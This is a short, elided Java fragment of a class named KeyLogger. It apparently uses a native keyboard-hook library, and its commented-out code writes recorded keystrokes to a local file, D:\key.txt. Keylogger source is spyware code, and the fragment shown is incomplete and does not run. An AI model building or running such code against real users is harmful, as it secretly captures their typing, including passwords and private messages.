...
public class KeyLogger implements NativeKeyListener {
	...
	public void send_KeyLogger() throws IOException, NativeHookException {
		/*
		 * GlobalScreen.unregisterNativeHook(); System.out.println(record); File myObj =
		 * new File("D:\\key.txt"); FileWriter fileWriter = new
		 * FileWriter("D:\\key.txt"); PrintWriter printWriter = new
		 * PrintWriter(fileWriter); printWriter.print(record); printWriter.close();
		 * //Escape();
		 */
		// printWriter.close();
